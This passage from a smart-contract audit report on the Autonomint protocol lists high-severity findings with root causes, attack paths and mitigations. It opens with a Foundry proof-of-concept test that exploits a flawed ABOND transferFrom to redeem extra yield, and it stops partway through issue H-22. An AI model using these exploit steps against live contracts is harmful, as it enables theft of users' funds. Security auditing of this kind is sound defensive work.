        uint8 strikePricePercent = uint8(IOptions.StrikePrice.FIVE);
        uint64 strikePrice = uint64(ethPrice + (ethPrice * ((strikePricePercent * 5) + 5)) / 100);
        uint256 amount = 10 ether;

        address USER_2 = makeAddr("USER_2");

        uint128 usdtToDeposit = uint128(contractsB.cds.usdtLimit());
        uint256 liquidationAmount = usdtToDeposit / 2;

        // deposit in CDS so there is back funds for the USDa
        address cdsDepositor = makeAddr("depositor");

        {
            vm.startPrank(cdsDepositor);

            contractsB.usdt.mint(cdsDepositor, usdtToDeposit);
            contractsB.usdt.approve(address(contractsB.cds), usdtToDeposit);
            vm.deal(cdsDepositor, globalFee.nativeFee);
            contractsB.cds.deposit{value: globalFee.nativeFee}(
                usdtToDeposit, 0, true, uint128(liquidationAmount), 150000
            );

            vm.stopPrank();
        }

        {
            vm.startPrank(USER_2);
            vm.deal(USER_2, globalFee.nativeFee + amount);
            contractsB.borrow.depositTokens{value: globalFee.nativeFee + amount}(
                ethPrice,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(
                    IOptions.StrikePrice.FIVE, strikePrice, ETH_VOLATILITY, IBorrowing.AssetName(ETH), amount
                )
            );

            vm.stopPrank();
        }

        {
            vm.startPrank(USER);

            vm.deal(USER, globalFee.nativeFee + (amount / 2));
            contractsB.borrow.depositTokens{value: globalFee.nativeFee + (amount / 2)}(
                ethPrice,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(
                    IOptions.StrikePrice.FIVE, strikePrice, ETH_VOLATILITY, IBorrowing.AssetName(ETH), amount / 2
                )
            );

            vm.stopPrank();
        }

        vm.warp(block.timestamp + 12960);
        vm.roll(block.number + 1080);

        address account1 = makeAddr("account1");
        address account2 = makeAddr("account2");
        address account3 = makeAddr("account3");

        {
            vm.startPrank(USER);

            uint64 index = 1;

            Treasury.GetBorrowingResult memory getBorrowingResult = contractsB.treasury.getBorrowing(USER, index);
            Treasury.DepositDetails memory depositDetail = getBorrowingResult.depositDetails;

            uint256 currentCumulativeRate = contractsB.borrow.calculateCumulativeRate();
            contractsB.usda.mint(USER, 1 ether); // @audit so there are enough funds (doesn't affect the PoC)
            uint256 tokenBalance = contractsB.usda.balanceOf(USER);

            if ((currentCumulativeRate * depositDetail.normalizedAmount) / 1e27 > tokenBalance) {
                return;
            }

            contractsB.usda.approve(address(contractsB.borrow), tokenBalance);
            vm.deal(USER, globalFee.nativeFee);
            contractsB.borrow.withDraw{value: globalFee.nativeFee}(
                USER, index, "0x", "0x", ethPrice, uint64(block.timestamp)
            );

            contractsB.abond.transfer(account2, contractsB.abond.balanceOf(USER));

            vm.stopPrank();
        }

        {
            vm.startPrank(USER_2);

            uint64 index = 1;

            Treasury.GetBorrowingResult memory getBorrowingResult = contractsB.treasury.getBorrowing(USER_2, index);
            Treasury.DepositDetails memory depositDetail = getBorrowingResult.depositDetails;

            uint256 currentCumulativeRate = contractsB.borrow.calculateCumulativeRate();
            contractsB.usda.mint(USER_2, 1 ether); // @audit so there are enough funds (doesn't affect the PoC)
            uint256 tokenBalance = contractsB.usda.balanceOf(USER_2);

            if ((currentCumulativeRate * depositDetail.normalizedAmount) / 1e27 > tokenBalance) {
                return;
            }

            contractsB.usda.approve(address(contractsB.borrow), tokenBalance);
            vm.deal(USER_2, globalFee.nativeFee);
            contractsB.borrow.withDraw{value: globalFee.nativeFee}(
                USER_2, index, "0x", "0x", ethPrice - 15000, uint64(block.timestamp)
            );

            // see the "Internal pre-conditions" section to see that matches the following
            contractsB.abond.transfer(account1, contractsB.abond.balanceOf(USER_2));

            vm.stopPrank();
        }

        { // needed so there is something to steal, this proves the issue
            vm.startPrank(USER);

            vm.deal(USER, globalFee.nativeFee + (amount / 2));
            contractsB.borrow.depositTokens{value: globalFee.nativeFee + (amount / 2)}(
                ethPrice,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(
                    IOptions.StrikePrice.FIVE, strikePrice, ETH_VOLATILITY, IBorrowing.AssetName(ETH), amount / 2
                )
            );

            vm.stopPrank();
        }

        {
            // here the attack starts
            (, uint128 ethBacked1Before,) = contractsB.abond.userStates(account1);
            (, uint128 ethBacked2Before,) = contractsB.abond.userStates(account2);

            assert(ethBacked1Before > ethBacked2Before);

            uint256 acount2AbondBalance = contractsB.abond.balanceOf(account2);
            uint256 acount1AbondBalance = contractsB.abond.balanceOf(account1);

            // check how much eth it would get in case attack is not performed
            (, uint256 redeemableAmountBefore2,) =
                contractsB.borrow.getAbondYields(account2, uint128(acount2AbondBalance));
            (, uint256 redeemableAmountBefore1,) =
                contractsB.borrow.getAbondYields(account1, uint128(acount1AbondBalance - 1));

            // step 1 from "Attack path" section
            vm.prank(account1);
            contractsB.abond.approve(account2, 1);

            // step 2 from "Attack path" section
            vm.prank(account2);
            contractsB.abond.transferFrom(account1, account3, 1);

            (, uint128 ethBacked1After,) = contractsB.abond.userStates(account1);
            (, uint128 ethBacked2After,) = contractsB.abond.userStates(account2);

            assertEq(ethBacked1Before, ethBacked1After);
            assert(ethBacked2Before < ethBacked2After);

            // step 3 from "Attack path" section
            vm.startPrank(account2);
            contractsB.abond.approve(address(contractsB.borrow), type(uint256).max);
            uint256 withdrawedAmount2 = contractsB.borrow.redeemYields(account2, uint128(acount2AbondBalance));
            vm.stopPrank();

            // "Impact" section, point 3
            assert(withdrawedAmount2 > redeemableAmountBefore2);

            vm.startPrank(account1);
            contractsB.abond.approve(address(contractsB.borrow), type(uint256).max);
            uint256 withdrawedAmount1 = contractsB.borrow.redeemYields(account1, uint128(acount1AbondBalance - 1));
            vm.stopPrank();

            // "Impact" section, point 3
            assertEq(withdrawedAmount1, redeemableAmountBefore1);
        }
    }
```

To run the test:
```bash
forge test --fork-url https://mainnet.mode.network/ --mt test_PoC_TransferFromBroken -vvv
```

### Mitigation

Update the `userState` of `from` and not of `msg.sender` in [`ABONDToken::transferFrom`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Token/Abond_Token.sol#L147-L170):
```diff
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        // check the input params are non zero
        require(from != address(0) && to != address(0), "Invalid User");
        
        // get the sender and receiver state
        State memory fromState = userStates[from];
        State memory toState = userStates[to];
        
        // update receiver state
        toState = Colors._credit(fromState, toState, uint128(value));
        userStates[to] = toState;
        
        // update sender state
        fromState = Colors._debit(fromState, uint128(value));
-       userStates[msg.sender] = fromState;
+       userStates[from] = fromState;
        
        // transfer abond
        super.transferFrom(from, to, value);
        return true;
    }
```

# Issue H-10: Users can withdraw liquidated collateral 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/696 

## Found by 
0x37, John44, santiellena, t.aksoy, valuevalk, volodya, wellbyt3

### Summary

If a user gets liquidated through `liquidationType2` they will still be able to withdraw their collateral and repay their debt as `depositDetail.liquidated` is not set to true. This is problematic as the collateral will have already been sent to Synthethix, and the collateral that the liquidated user withdraws will most likely be taken from the collateral of other users.

Furthermore, the necessary liquidation state changes performed in `liquidationType1` are omitted in the second type:
https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L241-L277

This is problematic as numerous parts of the protocol are reliant on this values, for example the CDS cumulative value which determines the profits/losses of CDS depositors.

### Root Cause

In borrowLiquidation.liquidationType2 `depositDetail.liquidated` is not set to true.
https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L324-L366

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. A user gets liquidated through `liquidationType2` and their collateral gets transferred to Synthetix.
2. Even though they have been liquidated they can still withdraw their collateral as no state changes have been made to their deposit.

### Impact

Liquidated users can withdraw their collateral. If that occurs the withdrawn collateral will be taken from the deposits of other borrowers.

### PoC

_No response_

### Mitigation

Perform the appropriate state changes when `liquidationType2` gets called.

# Issue H-11: Borrower withdrawing at a loss will cause losses for cds depositors that only withdraw after the price recovers 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/734 

## Found by 
0x73696d616f

### Summary

Borrowers withdrawing at a loss get downside protection from cds depositors. If these cds depositors withdraw at the same price as the borrower withdrawal that triggered the loss, it works correctly. However, if they do not withdraw, but wait for the price to come back up, they will get their full cds amount back at the expense of other users in the protocol, such as cds depositors that deposit after the price recovers.

### Root Cause

In `BorrowLib.sol:874`, the downside protection is increased.
In `CDS.sol:328`, the downside protection loss is realized.
In `CDS.sol:343`, the return amount will be calculated after the price goes down and then up, returning the full amount to the cds depositor.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Cds depositor deposits 1000 usda.
2. Borrower borrows 800 usda for a deposit of 1 ETH at a price of 1000 USD / ETH.
3. Price drops to 900 USD / ETH.
4. Borrower withdraws, [adding](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L930-L934) to the cumulative value a loss of `1 * (1000 - 900) / 1000 = 0.1`, where 1000 - 900 is the price diff, 1 is the vault balance (1  ETH deposited to borrow) and 1000 in the denominator is the cds deposit made. It also [adds](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L873-L875) 100 downside protected.
5. New borrower deposits 1 ETH at a price of 900 USD / ETH.
6. Price comes back up to 1000 USD / ETH
7. CDS depositor deposits 1000 USDa, which triggers the increase of the cumulative value gain by `1 * (1000 - 900) / 1000 = 0.1`, effectively bringing the cumulative value to 0 (it was -0.1. before). Note that it divides by 1000 and not 900, as the downside protection is applied later. The cds deposited amount becomes 1000 + 1000 - 100 = 1900, where the first 1000 is from the first cds depositor, 1000 from this cds deposit and 100 reduced from the downside protection.
8. First cds depositor withdraws their 1000 USDa, at a cumulative value of 0 both now and at the time of the deposit as it went down and up, bringing the cds deposited amount to 900.
9. Second cds depositor can not withdraw 1000 cds, because the cds deposited variable is only 900, underflowing by 100. This happens even though the price is exactly the same for the second depositor and no lossy withdrawal happened in the meantime.

### Impact

Second cds depositor is not able to withdraw their cds deposit as the first cds depositor took 900 USDa even though it contributed to the downside protection, not the second one. This will also happen on a larger scale in case more borrows / depositors participate, the presented scenario was just an example.

### PoC

POC described in the attack path section.

### Mitigation

There are a few options:
1. Consider enforcing the loss on the first cds depositor as the downside protection was applied when it was in the protocol.
2. Or, increase the cds deposited amount variable when the price comes back up, even if it was down before.

# Issue H-12: Total cds deposited amount is incorrectly modified when cds depositor is at a loss, leading to stuck USDa 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/738 

## Found by 
0x73696d616f

### Summary

The total cds deposited amount is [decreased](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L713) by the [returned amount](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L343) when the cds depositor withdraws, which will include any loss that the cds depositor has taken. After the withdrawal, the following cumulative values will be [calculated](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L312) based on this faulty total cds deposited amount and lead to stuck USDa.

### Root Cause

In `CDSLib.sol:713`, `params.omniChainData.totalCdsDepositedAmount` is decreased by `params.cdsDepositDetails.depositedAmount`, which includes the loss.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Cds depositors deposit 400 and 600 USDa, respectively, at a price of 1000 USD / ETH.
2. Borrower deposits 1 ETH at the same 1000 USD / ETH price.
3. Price drops to 900 USD / ETH.
4. 400 cds depositor withdraws, calculating a lossy cumulative value of `1 * (1000 - 900) / 1000 = 0.1`. The return amount is `400 - 400 * 0.1 = 360`. The final total cds deposited amount is 1000 - 360 = 640.
5. All the cumulative values will be calculated on a total cds deposited amount of 640, but the cds depositor left has 600 deposit amount, so all values will be off. For example, consider that the price goes up to 1000 USD / ETH again, and the cds depositor withdraws. The cumulative value will be increased by `1 * (1000 - 900) / 640 = 0.15625`, netting `-0.1 + 0.15625 = 0.05625`, which becomes `600 + 600 * 0.05625 = 633.75`, so 6.25 USDa will be stuck.
6. Alternatively, if the price drops to 850 USD / ETH, and the borrower withdraws, the final total cds deposited amount will underflow, as the downside protected value is 150, so it becomes `640 - 150 - (600 - 600 * (0.1 + 1 * (900 - 850) / 640)) = -3.125`. Note that if it was divided by 600, instead of 640, it would not underflow and everything would add up, for example.

### Impact

Stuck USDa, loss of USDa on withdrawal or DoSed withdrawal, depending on use case.

### PoC

See attack path above.

### Mitigation

Divide by the correct total cds deposited, such that the sum of individual cds deposited amounts equals the total cds deposited amount.

# Issue H-13: Cds depositors profit up to the strike price is not redeemable as the total cds deposited amount is not increased 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/743 

## Found by 
0x73696d616f, John44

### Summary

Cds depositors get the profit on the eth price increase up to the strike price (5%), and any increase above this threshold goes to the borrowers. However, this amount is never added to the total cds deposited amount, which means that cds depositors can not actually withdraw it as it would underflow.

### Root Cause

In `borrowing.sol:667/667`, the upside is not added to `omniChainData.totalCdsDepositedAmount`.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Price increase of a borrower deposit, who withdraws.
2. The upside is not added to the total cds deposited amount, so the cds depositors can not withdraw this profit or it underflows.

### Impact

Cds depositors upside is not withdrawable and will underflow.

### PoC

[Here](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L665) the upside is not added to the total cds deposited amount, which means that it will underflow when cds depositors withdraw the profit [here](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L713). The profit is added [here](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L343).

### Mitigation

Add the upside to `omniChainData.totalCdsDepositedAmount`.

# Issue H-14: Cds depositor profit is never taxed as the tax is only applied on the option fees 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/744 

## Found by 
0x37, 0x73696d616f, John44, valuevalk

### Summary

Cds depositor generates [upside](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L665-L667) from borrows up to the strike price increase, but [calculates](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L801) the profit on the difference between the deposited and returned amounts, which only [differ](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L351-L352) by the option fees.

### Root Cause

In `CDSLib.sol:801`, the profit should be calculated on the initial deposited amount without considering the extra profit for the price increase.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Price increases 5% since a borrower/cds depositor deposited.
2. Cds depositor withdraws, not paying any tax on the 5% price increase.

### Impact

Protocol suffers huge losses by not taxing 10% of the profit.

### PoC

See the links above.

### Mitigation

Calculated the profit on the price increase since the cds deposit and the option fees.

# Issue H-15: Type 1 borrower liquidation will incorrectly add cds profit directly to `totalCdsDepositedAmount` 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/746 

## Found by 
0x73696d616f

### Summary

Borrower liquidations of type 1 add a cds profit component to cds depositors by [reducing](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L248) `totalCdsDepositedAmount` by a smaller amount of this profit.
The problem with this approach is that it will always calculate cumulative values and option fees based on this value, that is bigger than the individual sum of cds depositors, so some values will be left untracked.

### Root Cause

In `borrowLiquidation.sol:248`, `omniChainData.totalCdsDepositedAmount` is incorrectly reduced by `liquidationAmountNeeded - cdsProfits;`.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Borrower is liquidated and there is profit.
2. Profit is added to `omniChainData.totalCdsDepositedAmount`, which now differs from the individual sum of cds depositors, leading to untracked values, such as the cumulative value from the vault long position or option fees.

### Impact

Cumulative value calculations and option fees will be incorrect, as they are divided by a bigger number of cds deposited (which was added the profit), but each cds depositor only has the same deposited amount to multiply by these rates.

### PoC

Consider a borrower that deposited 1 ETH at a 1000 USD / ETH price and borrowed 800 USDa. There is 1 cds depositor that deposited 1000 USDa. The price drops 20% and `borrowLiquidation::liquidationType1()` is called.
- `returnToAbond` is `(1000 - 800) * 10 / 100 = 20`.
- `cdsProfits` is `1000 - 800 - 20 = 180`.
- `liquidationAmountNeeded` is `800 + 20 = 820`.
- `cdsAmountToGetFromThisChain` is `820 - 180 = 640`.
- `omniChainData.totalCdsDepositedAmount` is `1000 - (820 - 180) = 360`.
Now, every cumulative value or option fee is calculated as if there were 360 USDa deposited as cds depositors, but this is not true, as 820 cds will be liquidated and only 180 is left. The profit should be accounted for, but not in this variable.

### Mitigation

Do not add the profit to `totalCdsDepositedAmount`.

# Issue H-16: Liquidation profit is never given to cds depositors who will take these losses 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/750 

## Found by 
0x73696d616f, volodya

### Summary

Liquidation profit is calculated in `borrowingLiquidation::liquidationType1()`, but is actually never handled and given to cds depositors. It is [stored](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L221) and added to `totalCdsDepositedAmount`, but it is missing the functionality to send the profits to cds depositors in [CDSLib::withdrawUser()](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L639-L663).

### Root Cause

In `CDSLib::withdrawUser()`, the cds profits stored in `omniChainCDSLiqIndexToInfo` are not given to the cds depositors.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Borrower is liquidated, cds profits are calculated but when the cds depositors withdraw, they do not receive these profits.

### Impact

Cds depositors take losses on liquidation instead of profiting.

### PoC

See the links above.

### Mitigation

Calculate the share of the profits and send to the cds depositors.

# Issue H-17: `borrowing::withdraw()` at a loss will increase downside protected and misscalculate option fees 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/757 

## Found by 
0x73696d616f

### Summary

`borrowing::withdraw()` at a loss increases the downside protected, [here](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L873-L875). Then, whenever someone deposits to borrow, option fees are [added](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L731) to the cumulative rate, which is [calculated](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L680) based on `omniChainData.totalCdsDepositedAmountWithOptionFees - omniChainData.downsideProtected`.
As it calculates the rate based on a decreased amount, but the rate is then multiplied by the full amount checkpointed at the cds deposit (normalized), extra option fees will be given to cds depositors.

### Root Cause

In `CDS.sol:680`, downside protected is subtracted from `totalCdsDepositedAmountWithOptionFees`. 

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Consider a eth price of 1000 USD / ETH.
2. Cds deposits 1000 USDa.
3. Borrower deposits 1 ETH and borrows 800 USDa.
4. Price drops to 900 USD / ETH.
5. Borrower withdraws, setting downside protected to 100.
Now, assume that the first borrower did not charge option fees, for simplicity, and the rate is 1 (ignore precision).
6. Another borrower deposits, charging 50 USD option fees given by `uint128 percentageChange = _fees / netCDSPoolValue; = 50 / (1000 - 100) = 50 / 900`. `currentCumulativeRate = 1 + 50 / 900 = 950 / 900`. [Here](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L680) is the downsideProtection subtracted and the percentage calculation [here](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L182).
7. Cds depositor withdraws (after borrower withdraws or there is enough ratio), calculating option fees given by `cdsDepositDetails.normalizedAmount * omniChainData.lastCumulativeRate) - cdsDepositDetails.depositedAmount`, where `cdsDepositDetails.normalizedAmount = 1000 / 1 = 1000`, yielding `1000 / 1 * 950 / 900 - 1000 =  55.555`, more than the 50 USD option fees.

### Impact

Cds depositors gets more option fees than it should, stealing USDa from other users in the protocol, such as other cds depositors that will not be able to withdraw due to lack of liquidity.

### PoC

See the calculations above.

### Mitigation

The downside protection must not be taken into account when calculating the option fees.

# Issue H-18: Some liquidated collateral will be locked 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/759 

## Found by 
0x37, 0x73696d616f

### Summary

After we liquidate via liquidation type1 method, all cds owner's liquidation share will change. This will cause some liquidated collateral will be locked.

### Root Cause

When one borrow position is unhealthy, the admin will liquidate this position. We will record each liquidated position's [needed liquidation amount](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L219). When cds owners withdraw their positions, we will loop all liquidated positions to check this position's used liquidated amount.

When we record this liquidated position's needed liquidation amount, we use `liquidationAmountNeeded`. But we update `omniChainData.totalAvailableLiquidationAmount` via deducting `liquidationAmountNeeded - cdsProfits`.

When cds owners withdraw their positions, `liquidationAmountNeeded` amount will be deducted from their liquidation amount, but we only deduct `liquidationAmountNeeded - cdsProfits` from the `totalAvailableLiquidationAmount`. This will cause the left liquidation amount from all cds owners will be less than `totalAvailableLiquidationAmount`.

For example:
1. Alice deposits 2000 USDT/USDA and opt in the liquidation. The liquidation amount is 2000 USDA. `totalAvailableLiquidationAmount` = 2000 USDA.
2. Bob borrows some UDSA and is liquidated because the ether price drops. Assume `liquidationAmountNeeded` = 1000 USDA, `cdsProfits` = 150 USDA. Then `totalAvailableLiquidationAmount` after the first liquidation will be 1150 USDA.
3. Cathy borrows some USDA and is liquidated because the ether price drops.
4. Alice withdraw her position and we will calculate the deducted liquidation amount.
4.1. In the first loop round, share is 100%, we will deduct 1000 from Alice's liquidation amount. `params.cdsDepositDetails.liquidationAmount` = 1000.
4.2 In the second loop round, `liquidationData.availableLiquidationAmount` is 1150 USDA. Alice's share will be less than 100%. But Alice is the only cds owners. Alice cannot get all liquidated collateral. This will cause some liquidated collateral will be locked.
```solidity
        liquidationInfo = CDSInterface.LiquidationInfo(
            liquidationAmountNeeded,
            cdsProfits,
            depositDetail.depositedAmount,
            omniChainData.totalAvailableLiquidationAmount,
            depositDetail.assetName,
            ((depositDetail.depositedAmount * exchangeRate) / 1 ether)
        );
        ...
        omniChainData.totalAvailableLiquidationAmount -= liquidationAmountNeeded - cdsProfits;
```
```solidity
                for (uint128 i = (liquidationIndexAtDeposit + 1); i <= params.omniChainData.noOfLiquidations; i++) {
                    uint128 liquidationAmount = params.cdsDepositDetails.liquidationAmount;
                    if (liquidationAmount > 0) {
                        CDSInterface.LiquidationInfo memory liquidationData = omniChainCDSLiqIndexToInfo[i];
                        uint128 share = (liquidationAmount * 1e10) / uint128(liquidationData.availableLiquidationAmount);
                        params.cdsDepositDetails.liquidationAmount -= getUserShare(liquidationData.liquidationAmount, share);
                        ...
                    }

```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

1. Alice deposits 2000 USDT/USDA and opt in the liquidation. The liquidation amount is 2000 USDA. `totalAvailableLiquidationAmount` = 2000 USDA.
2. Bob borrows some UDSA and is liquidated because the ether price drops. Assume `liquidationAmountNeeded` = 1000 USDA, `cdsProfits` = 150 USDA. Then `totalAvailableLiquidationAmount` after the first liquidation will be 1150 USDA.
3. Cathy borrows some USDA and is liquidated because the ether price drops.
4. Alice withdraw her position and we will calculate the deducted liquidation amount.
4.1. In the first loop round, share is 100%, we will deduct 1000 from Alice's liquidation amount. `params.cdsDepositDetails.liquidationAmount` = 1000.
4.2 In the second loop round, `liquidationData.availableLiquidationAmount` is 1150 USDA. Alice's share will be less than 100%. But Alice is the only cds owners. Alice cannot get all liquidated collateral. This will cause some liquidated collateral will be locked.

### Impact

Some liquidated collateral will be locked.

### PoC

N/A

### Mitigation

_No response_

# Issue H-19: Cds amounts to reduce from each chain are incorrect and will lead to the inability to withdraw cds in one of the chains 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/762 

## Found by 
0x73696d616f

### Summary

The cds amount to reduce on liquidations from each chain is given by the share of cds deposit, but then the liquidation amount by each cds depositor is given by the available liquidation amount pro-rata to the depositor's liquidation amount, which renders the first share calculation incorrect.

### Root Cause

In `CDSLib.sol:728`, `totalCdsDepositedAmount` is reduced by `params.cdsDepositDetails.depositedAmount - params.cdsDepositDetails.liquidationAmount`, but in `BorrowLib:390`, the share is given by the cds amounts of each chain, not the available liquidation amounts.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Consider 2 chains, A has 1000 cds deposited with 1000 available liquidation amount; chain B has 19000 cds deposited, also 1000 available liquidation amount. 1 borrower is liquidated with 1 ETH deposited at a price of 1000 USD / ETH and 800 USDa borrowed.
2. The calculations in [BorrowLib::getLiquidationAmountProportions()](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L375) yield, for chain A, B, respectively:
- shares 0.05;0.95.
- `_liqAmount` is 820 (1000 - 800 - 20, where 800 is the debt and 20 is the amount to return to abond, given by `(1000 - 800) * 10 / 100`)
- `liqAmountToGet` is 41;779 (820 multiplied by the shares of each chain)
- `cdsProfits` are 9;171 (total is 180, 1000 - 820, these 2 are multiplied by shares)
- `cdsAmounts` 32;608 (chainA cds amount to get is 41 - 9 = 32 and chainB is 779 - 171 = 608).

Chain B will have 18000 cds withdrawn (consider that the price goes back up in the meantime and they don't take losses), and only the cds depositor that provided liquidation amount is left. As it will fetch 608 cds amount from the cds, it becomes `19000 - 18000 - 608 = 392`. Then, when it loops through the liquidations that happened, share is `50%` (availableLiquidationAmount / totalAvailableLiquidationAmount), so `params.cdsDepositDetails.liquidationAmount` becomes `1000 - 0.5 * 820 = 590`. Then, `totalCdsDepositedAmount -= (params.cdsDepositDetails.depositedAmount - params.cdsDepositDetails.liquidationAmount); = 392 - (1000 - 590) = -18`, which underflows.
This proves that Chain B is overcharged.


### Impact

The chain with the most cds will be charged to much cds as the liquidation amount to subtract for each depositor is given by the available liquidation amount, but the cds was removed based on the cds amount.

### PoC

See above.

### Mitigation

Consider using share calculation in `borrowingLiquidation.sol` based on the available liquidation amounts themselves.

# Issue H-20: `borrowing::liquidate()` sends the wrong liquidation index to the destination chain, overwritting liquidation information and getting collateral stuck 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/775 

## Found by 
0x37, 0x73696d616f, santiellena

### Summary

`borrowing::liquidate()` sends the `noOfLiquidations` variable as liquidation index to the other chain. However, liquidations are tracked in `omniChainData.noOfLiquidations`, on both chains. For example, if a liquidation happens on chain A, it increases to 1 and sends this information to chain B. If a liquidation happens on chain B, it will have index 2, not 1. 

### Root Cause

In `borrowing:402`, the wrong variable is sent as liquidation index to the other chain.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Liquidation happens on chain A, incrementing `omniChainData.noOfLiquidations` to 1 and `noOfLiquidations` to 1 also.
2. Liquidation happens on chain B, [with index 2](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L199) (it received the omnichain data from chain A and then incremented it). In chain B, it sends the liquidation info to chain A, but sends with index 1, not 2, as it uses the local  `noOfLiquidations` to send the index.
3. Chain A will have liquidation info with index 1 overiwritten by the liquidation of chain B, leading to stuck collateral of the first liquidation in chain A (as long as depositors have not withdraw, but if they have, they can't withdraw the second liquidation anyway).

### Impact

Stuck collateral.

### PoC

See above.

### Mitigation

Pass in the correct index, given by `omnichainData.noOfLiquidations`.

# Issue H-21: Malicious user can call `borrowing::calculateCumulativeRate()` any number of times to inflate debt rate as `lastEventTime` is not updated 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/778 

## Found by 
0x37, 0x73696d616f, 0xAadi, Audinarey, Cybrid, EgisSecurity, John44, KobbyEugene, PeterSR, RampageAudit, almurhasan, durov, onthehunt, super\_jack, volodya

### Summary

[borrowing::calculateCumulativeRate()](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L530) does not update `lastEventTime`, so the cumulative rate may be increased unbounded, forcing users to repay much more debt.

### Root Cause

In `borrowing::calculateCumulativeRate()`, `lastEventTime` is not updated.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Users deposit cds.
2. Users borrow.
3. Malicious user calls `borrowing::calculateCumulativeRate()` any number of times.
4. Borrowers have to repay much more debt.

### Impact

Borrowers take massive losses as they have to repay much more.

### PoC

See links above.

### Mitigation

Update `lastEventTime`.

# Issue H-22: Late abond holders steal USDa amount from liquidations from earlier abond holders 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/817 

## Found by 
0x73696d616f

### Summary

`BorrowLib::redeemYields()` [gets](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L996) `usdaToAbondRatioLiq`, which is the amount of USDa gained from liquidations pro-rata to the total supply of abond, at current value without consideration from previous depositors. This means that if some user holds abond and a liquidation happens, other users can mint abond to steal yield from past liquidations.

### Root Cause

In `BorrowLib.sol:1002`, there is no consideration from past/next abond holders.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. User deposits and withdraws from `borrowing.sol`, minting abond tokens.
